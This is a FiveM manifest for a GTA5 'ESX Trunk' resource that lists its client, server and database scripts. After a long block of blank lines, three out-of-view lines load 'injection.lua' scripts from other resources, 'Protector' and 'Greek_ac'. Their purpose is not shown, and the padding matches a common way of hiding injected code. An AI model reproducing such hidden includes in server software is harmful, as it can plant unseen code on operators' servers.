fx_version 'adamant'

game 'gta5'

description 'ESX Trunk'

version '1.0.0'


client_scripts {
  'config.lua',
  'client/main.lua'
}

server_scripts {
  '@mysql-async/lib/MySQL.lua',
  'config.lua',
  'server/functions.lua',
  'server/main.lua'
}














server_script "@Protector/Server/injection.lua"
client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"